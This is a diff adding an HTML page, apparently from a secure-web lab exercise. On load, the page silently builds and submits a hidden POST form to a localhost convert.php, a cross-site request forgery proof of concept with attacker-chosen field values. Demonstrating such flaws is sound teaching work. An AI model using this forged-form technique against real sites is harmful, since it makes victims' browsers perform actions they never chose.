@@ -1,0 +1,36 @@
+<html>
+    <body>
+        <h1> this page creates a form like in convert.php</h1>
+        <script>
+            window.onload = function(){fill_and_send_form();}
+            function fill_and_send_form(){
+                
+                //create <form> element
+                var e = document.createElement("form");
+
+                //set the attributes of the form
+                e.action = "http://localhost/lab3_secure_web/convert.php";
+                e.target = "_self";
+                e.method ="post";
+
+
+                //create a string with html to set hidden fields
+                //corresponding to the edit user form
+                //with values chosen by the attacker
+                var form_fields;
+                form_fields += "<input type ='hidden' name='f' value ='55'>"; 
+                form_fields += "<input type ='hidden' name='c' value =''>"; 
+                
+                //add the fields to the form
+                e.innerHTML = form_fields;
+
+                //Add the form to the current page
+                document.body.appendChild(e);
+
+
+                //submit the form
+                e.submit();
+            }
+        </script>
+    </body>
+</html>
